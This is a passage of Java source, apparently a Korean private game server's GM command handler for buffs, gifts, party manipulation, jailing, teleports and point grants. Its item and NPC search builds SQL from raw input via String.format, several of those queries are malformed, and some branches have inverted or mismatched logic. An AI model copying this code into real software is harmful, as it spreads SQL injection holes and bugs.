							SC_PacketBox.broadcastGreen("\\f=운영자 주위 유저분들에게 선물을 드렸습니다 ▶▶ "+ temp.getNameId()+"("+count+")");
							SC_SystemMessage.send(gm, "\\aD화면 내 유저들에게 +" + enchant + " "+ temp.getNameId()+"(ID:" + itemid + ") "+ count +"개 보냄", true);
						}
					}
				} else {
					SC_SystemMessage.send(gm, "지정 ID의 아이템은 존재하지 않습니다.");
				}
			} catch (Exception e) {
				SC_SystemMessage.send(gm, ".[화면템주기] [아이템ID] [갯수] [인챈]");
			}
		}
		
	}

	// =====================================================
	// 운영자 주변 버프
	// =====================================================

	private static final int[] ALL_BUFF_1_SKILLS = {
			79
	};
	private static final int[] ALL_BUFF_2_SKILLS = {
			8135, 8136, 8137
	};
	private static final int[] ALL_BUFF_3_SKILLS = {
			7678
	};
	private static final int[] ALL_BUFF_4_SKILLS = {
			4914
	};
	private static final int[] ALL_BUFF_5_SKILLS = {
			50007
	};

	public void allBuff1(L1PcInstance gm) {
		applyGmAreaBuff(
				gm,
				ALL_BUFF_1_SKILLS,
				0,
				"\\aD운영자 주위에 '어드밴스 스피릿'이 시전되었습니다.");
	}


	private void allBuff2(L1PcInstance gm) {
		applyGmAreaBuff(
				gm,
				ALL_BUFF_2_SKILLS,
				0,
				"\\aD운영자 주위에 '메티스의 축복'이 시전되었습니다.");
	}


	private void allBuff3(L1PcInstance gm) {
		applyGmAreaBuff(
				gm,
				ALL_BUFF_3_SKILLS,
				0,
				"\\aD운영자 주위에 '생명의 마안'이 시전되었습니다.");
	}


	private void allBuff4(L1PcInstance gm) {
		applyGmAreaBuff(
				gm,
				ALL_BUFF_4_SKILLS,
				4914,
				"\\aD운영자 주위에 '흑사 버프'가 시전되었습니다.");
	}


	private void allBuff5(L1PcInstance gm) {
		applyGmAreaBuff(
				gm,
				ALL_BUFF_5_SKILLS,
				0,
				"\\aD운영자 주위에 '코마 버프'가 시전되었습니다.");
	}


	/**
	 * 운영자 주변 공용 버프 처리.
	 * @param gm            운영자
	 * @param skillIds      적용할 스킬 목록
	 * @param removeSkillId 먼저 제거할 스킬 ID, 없으면 0
	 * @param message       대상/운영자 알림 메시지
	 */
	private void applyGmAreaBuff(
			L1PcInstance gm,
			int[] skillIds,
			int removeSkillId,
			String message) {

		if (gm == null || skillIds == null || skillIds.length == 0) {
			return;
		}

		int appliedCount = 0;

		try {
			for (L1PcInstance pc :
					L1World.getInstance().getVisiblePlayer(gm, 22)) {

				if (pc == null
						|| pc.isPrivateShop()
						|| pc.isDead()
						|| pc.isGhost()) {
					continue;
				}

				if (removeSkillId > 0
						&& pc.hasSkillEffect(removeSkillId)) {

					pc.removeSkillEffect(removeSkillId);
				}

				final int targetId = pc.getId();
				final int x = pc.getX();
				final int y = pc.getY();

				for (int i = 0; i < skillIds.length; i++) {
					L1SkillUse.cast(
							pc,
							skillIds[i],
							targetId,
							x,
							y,
							null,
							0,
							L1SkillUse.TYPE_GMBUFF);
				}

				SC_SystemMessage.send(pc, message);

				appliedCount++;
			}
			if (appliedCount > 0) {
				SC_SystemMessage.send(gm, message);
			}

		} catch (Throwable t) {
			SC_SystemMessage.send(gm, ".버프 에러");

			t.printStackTrace();
		}
	}
	
	private void 혈맹포인트(L1PcInstance gm) {
//		if (!(gm.getClanRank() == 9 || gm.getClanRank() == 10))  { 
//		gm.sendPackets(new SC_SystemMessage("군주 또는 수호기사만 조회가 가능합니다."));
//	      return;
//	}
	if (gm.getClanid() != 0) {
		SC_SystemMessage.send(gm, "\\f:현재 혈맹포인트: ["+gm.getClan().getWarPoint()+"]");
		} else {
			SC_SystemMessage.send(gm, "혈맹에 가입되어 있지 않아 조회할 수 없습니다.");
		}
}

	
	

	private void party(L1PcInstance gm, String cmdName) {
		try {
			StringTokenizer tok = new StringTokenizer(cmdName);
			String cmd = tok.nextToken();
			if (cmd.equals("주변")) {
				L1Party party = new L1Party();
				if (gm.getParty() == null) {
					party.addMember(gm);
				} else {
					party = gm.getParty();
				}
				int range = 3;// 현재주변3칸
				for (L1PcInstance Targetpc : L1World.getInstance().getVisiblePlayer(gm, range)) {
					if (gm.getName().equals(Targetpc.getName())) {
						continue;
					}
					if (Targetpc.getParty() != null) {
						continue;
					} // 파티있는유저제외
					if (Targetpc.isPrivateShop()) {
						continue;
					} // 무인제외
					party.addMember(Targetpc);
					gm.sendPackets(Targetpc.getName() + "님을 내파티에 참가시켰습니다.");
				}
				gm.sendPackets(range + "칸 안의 유저를 내파티에 참가시켰습니다.");
			} else if (cmd.equals("화면")) {
				L1Party party = new L1Party();
				if (gm.getParty() == null) {
					party.addMember(gm);
				} else {
					party = gm.getParty();
				}
				for (L1PcInstance Targetpc : L1World.getInstance().getVisiblePlayer(gm)) {
					if (gm.getName().equals(Targetpc.getName())) {
						continue;
					}
					if (Targetpc.getParty() != null) {
						continue;
					}
					if (Targetpc.isPrivateShop()) {
						continue;
					}
					party.addMember(Targetpc);
					gm.sendPackets(Targetpc.getName() + "님을 내파티에 참가시켰습니다.");
				}
				gm.sendPackets("화면안의 유저를 내파티에 참가시켰습니다.");
			} else if (cmd.equals("전체")) {
				L1Party party = new L1Party();
				if (gm.getParty() == null) {
					party.addMember(gm);
				} else {
					party = gm.getParty();
				}
				int range = 3;// 현재주변3칸
				for (L1PcInstance Targetpc : L1World.getInstance().getAllPlayers()) {
					if (gm.getName().equals(Targetpc.getName())) {
						continue;
					}
					if (Targetpc.getParty() != null) {
						continue;
					}
					if (Targetpc.isPrivateShop()) {
						continue;
					}
					party.addMember(Targetpc);
					gm.sendPackets(Targetpc.getName() + "님을 내파티에 참가시켰습니다.");
				}
				gm.sendPackets(range + "칸 안의 유저를 내파티에 참가시켰습니다.");
			} else if (cmd.equals("참가")) {
				String TargetpcName = tok.nextToken();
				L1PcInstance TargetPc = L1World.getInstance().getPlayer(TargetpcName);
				if (TargetPc.getParty() != null) {
					gm.sendPackets(TargetPc.getName() + "님은 파티가 없습니다.");
				} else {
					TargetPc.getParty().addMember(gm);
					gm.sendPackets(TargetPc.getName() + "님의 파티에 참가했습니다.");
				}
			} else if (cmd.equals("초대")) {
				String TargetpcName = tok.nextToken();
				L1PcInstance TargetPc = L1World.getInstance().getPlayer(TargetpcName);
				L1Party party = new L1Party();
				if (gm.getParty() == null) {
					party.addMember(gm);
				} else {
					party = gm.getParty();
				}
				if (TargetPc.getParty() != null) {
					TargetPc.getParty().kickMember(TargetPc);
				}
				party.addMember(TargetPc);
				gm.sendPackets(TargetPc.getName() + "님을 내파티에 강제참가시켰습니다.");
			} else if (cmd.equals("강제초대")) {
				L1Party party = new L1Party();
				if (gm.getParty() == null) {
					party.addMember(gm);
				} else {
					party = gm.getParty();
				}
				// int range = 3;// 현재주변3칸
				for (L1PcInstance Targetpc : L1World.getInstance().getAllPlayers()) {
					if (gm.getName().equals(Targetpc.getName())) {
						continue;
					}
					if (Targetpc.isPrivateShop()) {
						continue;
					}
					if (Targetpc.getParty() != null) {
						Targetpc.getParty().kickMember(Targetpc);
					}
					party.addMember(Targetpc);
					gm.sendPackets(Targetpc.getName() + "님을 내파티에 참가시켰습니다.");
				}
				gm.sendPackets("접속중인 유저를 내파티에 강제참가시켰습니다.");
			} else if (cmd.equals("파장")) {
				if (gm.getParty() == null) {
					gm.sendPackets("참가중인파티가없습니다.");
				} else {
					gm.getParty().passLeader(gm);
					gm.sendPackets("파장을 뺐었습니다.");
				}
			}
		} catch (Exception e) {
			gm.sendPackets(".파티 [주변,화면,전체,참가 (유저이름)]");
			gm.sendPackets(".파티 [초대 (유저이름),강제초대,파장]");
		}
	}

	private void effect(L1PcInstance pc, String param) {
		try {
			StringTokenizer stringtokenizer = new StringTokenizer(param);
			int sprid = Integer.parseInt(stringtokenizer.nextToken());
			SC_SkillSound.send(pc, pc.getId(), sprid);
			SC_SkillSound.broadcast(pc, pc.getId(), sprid);
		} catch (Exception e) {
			pc.sendPackets(".이팩트 [숫자] 라고 입력해 주세요.");
		}
	}

	private int 최소값(int itemid) {
		try {
			Connection con = null;
			PreparedStatement pstm = null;
			ResultSet rs = null;
			try {
				con = DatabaseFactory.getInstance().getConnection();
				pstm = con.prepareStatement(
						"SELECT * FROM shop WHERE item_id = ? AND selling_price NOT IN (-1) ORDER BY selling_price ASC limit 1");
				pstm.setInt(1, itemid);
				rs = pstm.executeQuery();
				if (rs.next()) {
					int temp = 0;
					if (rs.getInt("pack_count") > 1)
						temp = rs.getInt("selling_price") / rs.getInt("pack_count");
					else {
						temp = rs.getInt("selling_price");
					}
					int i = temp;
					return i;
				}
			} catch (SQLException e) {
				e.printStackTrace();
			} finally {
				SQLUtil.close(rs, pstm, con);
			}
			return 0;
		} catch (Exception e) {
			e.printStackTrace();
		}
		return 0;
	}

	private int 최대값(int itemid) {
		try {
			Connection con = null;
			PreparedStatement pstm = null;
			ResultSet rs = null;
			try {
				con = DatabaseFactory.getInstance().getConnection();
				pstm = con.prepareStatement(
						"SELECT purchasing_price FROM shop WHERE item_id = ? ORDER BY purchasing_price DESC limit 1");
				pstm.setInt(1, itemid);
				rs = pstm.executeQuery();
				if (rs.next()) {
					int i = rs.getInt("purchasing_price");
					return i;
				}
			} catch (SQLException e) {
				e.printStackTrace();
			} finally {
				SQLUtil.close(rs, pstm, con);
			}
			return -1;
		} catch (Exception e) {
			e.printStackTrace();
		}
		return -1;
	}


	private void 상점검사(L1PcInstance gm) {
		try {
			ArrayList<Integer> itemids = new ArrayList<Integer>();
			Connection con = null;
			PreparedStatement pstm = null;
			ResultSet rs = null;
			int cnt;
			Iterator i$;
			try {
				con = DatabaseFactory.getInstance().getConnection();
				pstm = con.prepareStatement("SELECT item_id FROM shop");
				rs = pstm.executeQuery();
				while (rs.next()) {
					if (!itemids.contains(Integer.valueOf(rs.getInt("item_id")))) {
						itemids.add(Integer.valueOf(rs.getInt("item_id")));
					}
				}
				cnt = 0;
				for (i$ = itemids.iterator(); i$.hasNext();) {
					int itemid = ((Integer) i$.next()).intValue();
					int 구매최저가 = 최소값(itemid);
					int 판매최고가 = 최대값(itemid);
					if ((구매최저가 != 0) && (구매최저가 < 판매최고가)) {
						SC_ChatPacket.sendDirect(gm, gm, "검출됨! [템 " + itemid + " : [구매값 " + 구매최저가 + "] [매입값 " + 판매최고가 + "]");
					}
					cnt++;
				}
			} catch (SQLException e) {
				e.printStackTrace();
			} finally {
				SQLUtil.close(rs, pstm, con);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private String parseStat(String s) throws Exception {
		if (s.equalsIgnoreCase("힘"))
			return "str";
		else if (s.equalsIgnoreCase("덱스"))
			return "dex";
		else if (s.equalsIgnoreCase("콘"))
			return "con";
		else if (s.equalsIgnoreCase("인트"))
			return "int";
		else if (s.equalsIgnoreCase("위즈"))
			return "wis";
		else if (s.equalsIgnoreCase("카리"))
			return "cha";
		throw new Exception(s);
	}

	public void fullstat(L1PcInstance pc, String param) {
		try {
			String[] arr = param.split(" ");
			if (arr == null || arr.length < 2)
				throw new Exception();

			String s = parseStat(arr[0]);
			MJFullStater.running(pc, s, Integer.parseInt(arr[1]));
		} catch (Exception e) {
			SC_SystemMessage.send(pc, String.format(".스텟 [힘/덱스/콘/인트/위즈/카리] [올릴수] 남은스텟 %d", (pc.getLevel() - 50 - pc.getBonusStats())));
		}
	}

	private void 좌표(L1PcInstance pc) {
		try {
			long curtime = System.currentTimeMillis() / 1000;
			if (pc.getQuizTime2() + 5 > curtime) {
				long time = (pc.getQuizTime2() + 5) - curtime;
				SC_SystemMessage.send(pc, time + "초 후 사용할 수 있습니다.");
				return;
			}
			Updator.exec(
					"UPDATE characters SET LocX=33432,LocY=32807,MapID=4 WHERE account_name=? and MapID not in (38,5001,99,997,5166,39,34,701,2000)",
					new Handler() {
						@Override
						public void handle(PreparedStatement pstm) throws Exception {
							pstm.setString(1, pc.getAccountName());
						}
					});
			SC_SystemMessage.send(pc, "해당 계정 모든 케릭터가 기란으로 좌표가 변경 되었습니다");
			pc.setQuizTime(curtime);
		} catch (Exception e) {
		}
	}

	private void standBy(L1PcInstance gm, String param) {
		try {
			StringTokenizer st = new StringTokenizer(param);
			String status = st.nextToken();
			if (status.equalsIgnoreCase("켬")) {
				if (Config.STANDBY_SERVER) {
					gm.sendPackets("이미 대기 상태로 돌입하였습니다.");
					return;
				}
				Config.STANDBY_SERVER = true;
				SC_ChatPacket.broadcastOpcode("서버가 오픈대기에 돌입합니다. 일부 기능이 차단되었습니다", Opcodes.S_MESSAGE);
			} else if (status.equalsIgnoreCase("끔")) {
				if (!Config.STANDBY_SERVER) {
					gm.sendPackets("대기 상태가 아닙니다.");
					return;
				}

				ThreadPool.getInstance().execute(new Runnable() {
					@Override
					public void run() {
						// Config.load();
						Config.STANDBY_SERVER = false;


						L1World.getInstance().broadcastServerMessage("\\aH정상적으로 서버가 오픈되었습니다. 기다려주신 여러분들께 진심으로 감사합니다.");

						SC_PacketBox.broadcastGreen("정상적으로 서버가 오픈되었습니다. 기다려주신 여러분들께 진심으로 감사합니다.");
					//	grn.clear();
					}
				});
			}
		} catch (Exception eee) {
			gm.sendPackets(".오픈대기 [켬/끔] 으로 입력하세요.");
			gm.sendPackets("켬 - 오픈대기 상태로 전환 | 끔 - 일반모드로 게임시작");
		}
	}

	private void 메모리반환(L1PcInstance gm) {
		gm.sendPackets("메모리가 반환되었습니다.");
		System.out.println("강제로 가비지 처리를 진행 합니다.");
		System.gc();
		System.out.println("메모리 정리가 완료 되었습니다.");
	}

	private void hold(L1PcInstance gm, String pcName) {
		try {
			L1PcInstance target = L1World.getInstance().getPlayer(pcName);
			if (target != null) {
				holdnow(gm, target);
			} else {
				gm.sendPackets("그런 캐릭터는 없습니다.");
			}
		} catch (Exception e) {
			gm.sendPackets(".감옥 캐릭명 으로 입력해주세요.");
		}
	}

	private void holdnow(L1PcInstance gm, L1PcInstance target) {
		try {
			// L1Teleport.teleport(target, 32736, 32799, (short) 34, 5, true);
			// L1Teleport.teleport(target, 32835, 32782, (short) 701, 5, true);
			target.start_teleport(32736, 32799, 34, target.getHeading(), 169, false, true);
			//target.start_teleport(32835, 32782, 701, target.getHeading(), 169, false, true);
			gm.sendPackets((new StringBuilder()).append(target.getName()).append(" 님 감옥으로 이동됨.").toString());
			target.sendPackets("감옥에 감금 되었습니다.");
		} catch (Exception e) {
			_log.log(Level.SEVERE, "", e);
		}
	}

	private void nocall(L1PcInstance gm, String param) {
		try {
			StringTokenizer tokenizer = new StringTokenizer(param);
			String pcName = tokenizer.nextToken();
			L1PcInstance target = null; // q
			target = L1World.getInstance().getPlayer(pcName);
			if (target != null) { // 타겟
				// L1Teleport.teleport(target, 33437, 32812, (short) 4, 5,
				// true);
				target.start_teleport(33437, 32812, 4, target.getHeading(), 169, true, true);
			} else {
				gm.sendPackets("접속중이지 않는 유저 ID 입니다.");
			}
		} catch (Exception e) {
			gm.sendPackets(".가라 (보낼케릭터명) 으로 입력해 주세요.");
		}
	}

	private void searchObject(L1PcInstance gm, int type, String name) {
		try {
			String qry = null;
			switch (type) {
			case 0:// etcitem
				qry = String.format("select item_id, name, name_id from etcitem where name Like '%s'", name);
				break;
			case 1:// weapon
				qry = String.format("select item_id, name, name_id from weapon where name Like '%s'", name);
				break;
			case 2: // armor
				qry = String.format("select item_id, name, name_id from armor where name Like ' '%s'", name);
				break;
			case 3: // npc
				qry = String.format("select npcid, name, note from npc where name Like ' '%s'", name);
				break;
			case 4: // polymorphs
				qry = String.format("select polyid, name,id from polymorphs where name Like ' '%s'", name);
				break;
			case 5: // npc(gfxid)
				qry = String.format("select gfxid, name,note from npc where name Like ' '%s'", name);
				break;
			default:
				gm.sendPackets(".검색 [0~5] [name]을 입력 해주세요.");
				gm.sendPackets("0=잡템, 1=무기, 2=갑옷, 3=엔피시, 4=변신, 5=엔피시(gfxid)");
				return;
			}

			Selector.exec(qry, new FullSelectorHandler() {
				@Override
				public void result(ResultSet rs) throws Exception {
					int i = 0;
					while (rs.next()) {
						++i;
						gm.sendPackets(
								String.format("[%s]-[%s]-%s", rs.getString(1), rs.getString(2), rs.getString(3)));
					}
					gm.sendPackets(String.format("총 [%d]개 검색이 되었습니다.", i));
				}
			});
		} catch (Exception e) {
		}
	}
	

	
	
	private void 아아(L1PcInstance gm, String param) {
		
		
		int SearchCount = 0;
		
		
		StringTokenizer st = new StringTokenizer(param);
		String char_name = st.nextToken();
		L1PcInstance target = L1World.getInstance().getPlayer(char_name);
		try {
		if (target != null) {
			for (L1ItemInstance item : target.getInventory().getItems()) {
			
			
		if (item.get_item_level() > 0) {
			
		
		
		gm.sendPackets("\\f:"+item.getName()+" "+itemlevel(item));
		SearchCount++;
	
		
		
		}
		}
		
		gm.sendPackets("\\f:------------------------------------");
		gm.sendPackets("\\f:* 캐릭명: ["+target.getName()+"]  -  [ "+SearchCount +" ]개의 잠재력인형 보유");
		} else {
			gm.sendPackets("올바른 캐릭명을 입력해주세요.");
		}
		} catch (Exception e) {
			
		}
		
	}
	private void redo(L1PcInstance pc, String arg) {
		try {
			String lastCmd = _lastCommands.get(pc.getId());
			if (arg.isEmpty()) {
				pc.sendPackets("커맨드 " + lastCmd + " 을(를) 재실행합니다.");
				handleCommands(pc, lastCmd);
			} else {
				StringTokenizer token = new StringTokenizer(lastCmd);
				String cmd = token.nextToken() + " " + arg;
				pc.sendPackets("커맨드 " + cmd + " 을(를) 재실행합니다.");
				handleCommands(pc, cmd);
			}
		} catch (Exception e) {
			e.printStackTrace();
			pc.sendPackets(".재실행 커맨드에러");
		}
	}

	private void unprison(L1PcInstance pc, String param) {
		try {
			L1PcInstance target = L1World.getInstance().getPlayer(param);
			if (target != null) {
				unprisonnow(pc, target);
			} else {
				pc.sendPackets(".마을 캐릭명");
				pc.sendPackets("그런 이름의 캐릭터는 없습니다.");
			}
		} catch (Exception e) {
			pc.sendPackets(".마을 캐릭명");
		}
	}

	private void unprisonnow(L1PcInstance gm, L1PcInstance target) {
		try {
			int i = 33437;
			int j = 32803;
			short k = 4;
			// L1Teleport.teleport(target, i, j, k, 5, false);
			target.start_teleport(i, j, k, 5, 169, false, true);
			gm.sendPackets((new StringBuilder()).append(target.getName()).append(" 님을 마을로 이동.").toString());
		} catch (Exception e) {
			_log.log(Level.SEVERE, "", e);
		}
	}

	private void unprison2(L1PcInstance pc, String param) {
		try {
			L1PcInstance target = L1World.getInstance().getPlayer(param);
			if (target != null) {
				unprisonnow2(pc, target);
			} else {
				pc.sendPackets(".숨계 캐릭명");
				pc.sendPackets("그런 이름의 캐릭터는 없습니다.");
			}
		} catch (Exception e) {
			pc.sendPackets(".숨계 캐릭명");
		}
	}
	private void autoAllPresent(L1PcInstance gm, String param) {
		try {
			
			StringTokenizer st = new StringTokenizer(param);
			int cycle = Integer.parseInt(st.nextToken(), 10);
			int second = Integer.parseInt(st.nextToken(), 10) * 1000;
			int itemid = Integer.parseInt(st.nextToken(), 10);
			int enchant = Integer.parseInt(st.nextToken(), 10);
			int count = Integer.parseInt(st.nextToken(), 10);
			
			ThreadPool.getInstance().execute(new Runnable() {
				@Override
				public void run() {
					try {
						for (int i = 0; i < cycle; i++) {
							Collection<L1PcInstance> player = null;
							player = L1World.getInstance().getAllPlayers();
							for (L1PcInstance target : player) {
								if (target == null)
									continue;
								if (!target.isGhost() && !target.isPrivateShop()) {
									L1ItemInstance item = ItemTable.getInstance().createItem(itemid);
									item.setCount(count);
									item.setEnchantLevel(enchant);
									if (item != null) {
										if (target.getInventory().checkAddItem(item, count) == L1Inventory.OK) {
											target.getInventory().storeItem(item);
										}
									}
									target.sendPackets("오픈 대기 보상: " + item.getLogName() + " " + count + "개 획득 인벤토리 확인하세요");
									SC_SkillSound.send(target, target.getId(), 1091);// 비둘기액션
									SC_SkillSound.send(target, target.getId(), 4856);// 하트액션
								}
							}
							Thread.sleep(second);
						}
					} catch (Exception exception) {
						gm.sendPackets(".오토선물 [횟수] [시간]  [템ID] [인첸] [갯수]");

					}
				}
			});
			
			
		} catch (Exception exception) {
			gm.sendPackets(".오토선물 [횟수] [시간] [템ID] [인첸] [갯수]");
		}
		
		
	}
	private void 전체공지(L1PcInstance gm) {
		try {			
			ThreadPool.getInstance().execute(new Runnable() {
				@Override
				public void run() {
					try {
							Collection<L1PcInstance> player = null;
							player = L1World.getInstance().getAllPlayers();
							for (L1PcInstance target : player) {
								if (target == null)
									continue;
								if (!target.isGhost() && !target.isPrivateShop()) {
									SC_UserCommands17.send(target, 1);
								}
							}

				
					} catch (Exception exception) {
						gm.sendPackets("");

					}
				}
			});
			
			
		} catch (Exception exception) {
			gm.sendPackets("");
		}
		
		
	}
	private void unprisonnow2(L1PcInstance gm, L1PcInstance target) {
		try {
			int i = 32681;
			int j = 32853;
			short k = 2005;
			// L1Teleport.teleport(target, i, j, k, 5, false);
			target.start_teleport(i, j, k, target.getHeading(), 169, false, true);
			gm.sendPackets((new StringBuilder()).append(target.getName()).append(" 님을 숨계로 이동.").toString());
		} catch (Exception e) {
			_log.log(Level.SEVERE, "", e);
		}
	}
	public void 캐릭압류1(L1PcInstance gm, String name) {
		setCharBlock(gm, name);
	}
	private void chatx(L1PcInstance gm, String param) {
		try {
			StringTokenizer tokenizer = new StringTokenizer(param);
			String pcName = tokenizer.nextToken();
			L1PcInstance target = null;
			target = L1World.getInstance().getPlayer(pcName);
			if (target != null) {
				target.killSkillEffectTimer(L1SkillId.STATUS_CHAT_PROHIBITED);
				SC_SkillIconGFX.send(target, 36, 0);
				SC_ServerMessage.send(target, 288);
				gm.sendPackets("해당캐릭의 채금을 해제 했습니다.");
			}
		} catch (Exception e) {
			gm.sendPackets(".채금해제 캐릭터명 이라고 입력해 주세요.");
		}
	}

	private void tell(L1PcInstance gm) {
		try {
			gm.start_teleport(gm.getX(), gm.getY(), gm.getMapId(), gm.getHeading(), 169, false, false);
		} catch (Exception e) {
		}
	}

	public void levelup2(L1PcInstance gm, String arg) {
		try {
			StringTokenizer tok = new StringTokenizer(arg);
			String user = tok.nextToken();
			L1PcInstance target = L1World.getInstance().getPlayer(user);
			int level = Integer.parseInt(tok.nextToken());
			if (level == target.getLevel()) {
				return;
			}
			if (!IntRange.includes(level, 1, 99)) {
				gm.sendPackets("1-99의 범위에서 지정해 주세요");
				return;
			}
			target.setExp(ExpTable.getExpByLevel(level));
			gm.sendPackets(target.getName() + "님의 레벨이 변경됨! .검 [캐릭명]으로 확인요망");
		} catch (Exception e) {
			gm.sendPackets(".렙작 [캐릭명] [레벨] 입력");
		}
	}



	
	private void 혈맹포인트조회(L1PcInstance gm, String param) {
		try {
			StringTokenizer st = new StringTokenizer(param);
			String char_name = st.nextToken();
			L1PcInstance target = L1World.getInstance().getPlayer(char_name);
			
				
			if (target != null) {
				if (target.getClanid() != 0) {
					gm.sendPackets("\\f:"+target.getName() + "님의 혈맹이름 : "+target.getClanname());
					gm.sendPackets("\\f:현재 혈맹포인트: "+target.getClan().getWarPoint());
				
				} else {
					gm.sendPackets(target.getName() + "님은 혈맹에 속해있지 않습니다.");
				}
			} else {
				gm.sendPackets("존재하지 않는 유저 입니다.");
		}
	
		
			
		} catch (Exception e) {
			gm.sendPackets(".혈맹포인트조회 캐릭명");
		}
	}

	private void 혈맹포인트선물(L1PcInstance gm, String param) {
		// TODO 자동 생성된 메소드 스텁
		try {
			StringTokenizer st = new StringTokenizer(param);
			String 이름 = st.nextToken();
			int id = Integer.parseInt(st.nextToken());
			L1PcInstance 유저 = L1World.getInstance().getPlayer(이름);
			if (유저 != null) {
				if (유저.getClanid() != 0) {
				if (id <= 0) { gm.sendPackets("지급 포인트는 양수여야 합니다."); return; }
				final CIOClient gmSession = gm.getNetConnection();
				final CIOClient memberSession = 유저.getNetConnection();
				final String memberName = 유저.getName();
				ClanTable.changeWarPoint(유저.getClan(), id, committed -> {
					CIOThreadCallback.getInstance().completeSession(gmSession, () ->
						gm.sendPackets(committed
							? memberName + "님의 혈맹에게 혈맹포인트 [" + id + "]을 지급하였습니다."
							: "혈맹포인트 지급이 확정되지 않았습니다. DB 기록을 확인해 주세요."));
					if (committed) CIOThreadCallback.getInstance().completeSession(memberSession, () ->
						SC_PacketBox.send(유저, SC_PacketBox.GREEN_MESSAGE,
							"당신의 혈맹에게 운영자님께서 혈맹포인트 [" + id + "] 지급하였습니다"));
				});
				} else {
					gm.sendPackets(유저.getName() + "님은 혈맹에 속해있지 않습니다.");
				}
			} else
				gm.sendPackets("존재하지 않는 유저 입니다.");
		} catch (Exception e) {
			gm.sendPackets(".혈맹포인트선물 캐릭명 포인트갯수");
		}
	}
	private void 혈맹포인트삭제(L1PcInstance gm, String param) {
		// TODO 자동 생성된 메소드 스텁
		try {
			StringTokenizer st = new StringTokenizer(param);
			String 이름 = st.nextToken();
			int id = Integer.parseInt(st.nextToken());
			L1PcInstance 유저 = L1World.getInstance().getPlayer(이름);
			if (유저 != null) {
				if (유저.getClanid() != 0) {
				if (id <= 0) { gm.sendPackets("차감 포인트는 양수여야 합니다."); return; }
				final CIOClient gmSession = gm.getNetConnection();
				final CIOClient memberSession = 유저.getNetConnection();
				final String memberName = 유저.getName();
				ClanTable.changeWarPoint(유저.getClan(), -id, committed -> {
					CIOThreadCallback.getInstance().completeSession(gmSession, () ->
						gm.sendPackets(committed
							? memberName + "님의 혈맹에게 혈맹포인트 [" + id + "] 감소시켰습니다."
							: "혈맹포인트 차감이 확정되지 않았습니다. 잔액 및 DB 기록을 확인해 주세요."));
					if (committed) CIOThreadCallback.getInstance().completeSession(memberSession, () ->
						SC_PacketBox.send(유저, SC_PacketBox.GREEN_MESSAGE,
							"당신의 혈맹에게 운영자님께서 혈맹포인트 [" + id + "] 감소시켰습니다."));
				});
				} else {
					gm.sendPackets(유저.getName() + "님은 혈맹에 속해있지 않습니다.");
				}
			} else
				gm.sendPackets("존재하지 않는 유저 입니다.");
		} catch (Exception e) {
			gm.sendPackets(".혈맹포인트삭제 캐릭명 포인트갯수");
		}
	}
	
	private void 탐선물(L1PcInstance gm, String param) {
		// TODO 자동 생성된 메소드 스텁
		try {
			StringTokenizer st = new StringTokenizer(param);
			String 이름 = st.nextToken();
			int id = Integer.parseInt(st.nextToken());
			L1PcInstance 유저 = L1World.getInstance().getPlayer(이름);
			if (유저 != null) {
				유저.getNetConnection().getAccount().addTamPoint(id);
				유저.getNetConnection().getAccount().updateTam();
				try {
					SC_NewCreateItem.sendTamPoint(유저, 유저.getNetConnection());
				} catch (Exception e) {
				}
				gm.sendPackets(유저.getName() + "에게 탐 " + id + "개를 지급 하였습니다.");
				Message.getInstance().get_system_message(유저, "\\aA당신에게 메티스님께서 탐 '\\aG" + id + "\\aA' 을 지급 하였습니다.");
			} else
				gm.sendPackets("존재하지 않는 유저 입니다.");
		} catch (Exception e) {
		}
	}

	private void allrecall(L1PcInstance gm) {
		try {
			for (L1PcInstance pc : L1World.getInstance().getAllPlayers()) {
				if (!pc.isGm() && !pc.isPrivateShop()) {
					recallnow(gm, pc);
				}
			}
		} catch (Exception e) {
			gm.sendPackets(".전체소환 커맨드 에러");
		}
	}

	private void 봇소환(L1PcInstance gm, String param) {
		try {
			StringTokenizer st = new StringTokenizer(param);
			String 이름 = st.nextToken();

			L1PcInstance target = L1World.getInstance().getPlayer(이름);
			// L1Teleport.teleport(target, gm.getX(), gm.getY(), gm.getMapId(),
			// target.getHeading();
			target.start_teleport(gm.getX(), gm.getY(), gm.getMapId(), target.getHeading(), 169, true, true);
			gm.sendPackets("게임 마스터에게 소환되었습니다.");
		} catch (Exception e) {
			gm.sendPackets(".봇소환 캐릭명");
		}
	}

	private void recallnow(L1PcInstance gm, L1PcInstance target) {
		try {
			// L1Teleport.teleportToTargetFront(target, gm, 2 , 0);
			L1Teleport.getInstance().teleportToTargetFront(target, gm, 2, true);
			 target.sendPackets("게임 마스터에게 소환되었습니다.");
		} catch (Exception e) {
			_log.log(Level.SEVERE, "", e);
		}
	}

	private void ShopKick(L1PcInstance gm, String param) {
		try {
			L1PcInstance target = L1World.getInstance().getPlayer(param);
			if (target != null) {
				gm.sendPackets((new StringBuilder()).append(target.getName()).append("님을 추방 했습니다.").toString());
				GameServer.disconnectChar(target);
			} else {
				gm.sendPackets("그러한 이름의 캐릭터는 월드내에는 존재하지 않습니다.");
			}
		} catch (Exception e) {
			gm.sendPackets(".상점추방 캐릭명");
		}
	}

	private void chainfo(L1PcInstance gm, String param) {
		try {
			StringTokenizer stringtokenizer = new StringTokenizer(param);
			String s = stringtokenizer.nextToken();
			SC_Chainfo.send(gm, 1, s);
		} catch (Exception exception21) {
			SC_SystemMessage.send(gm, ".케릭검사 캐릭터명");
		}
	}
private void 퀘스트멘트(L1PcInstance gm, String param) {
		
		try {
			StringTokenizer st = new StringTokenizer(param);
			String status = st.nextToken();
			if (status.equalsIgnoreCase("켬")) {
				if (gm.퀘스트멘트 == true) {
					SC_SystemMessage.send(gm, "이미 퀘스트멘트 활성화 상태입니다.");
					return;
				}
				
				gm.퀘스트멘트 = true;
				
				SC_SystemMessage.send(gm, "퀘스트몬스터를 잡을 때 마다 남은 마릿수가 채팅창에 출력됩니다");
				
			} else if (status.equalsIgnoreCase("끔")) {
				if (gm.퀘스트멘트 == false) {
					SC_SystemMessage.send(gm, "이미 퀘스트멘트는 비활성화상태입니다.");
					return;
				}
				
				gm.퀘스트멘트 = false;
				
				SC_SystemMessage.send(gm, "\\f:퀘스트멘트가 비활성화되었습니다.");
			
			}
		} catch (Exception eee) {
			SC_SystemMessage.send(gm, ".퀘스트멘트 [켬/끔] 으로 입력하세요.");
			
		}
	}
	private void 물품멘트(L1PcInstance gm, String param) {
		int count = 0;
		int ccount = 0;
		
		
		try {
			StringTokenizer st = new StringTokenizer(param);
			String status = st.nextToken();
			if (status.equalsIgnoreCase("켬")) {
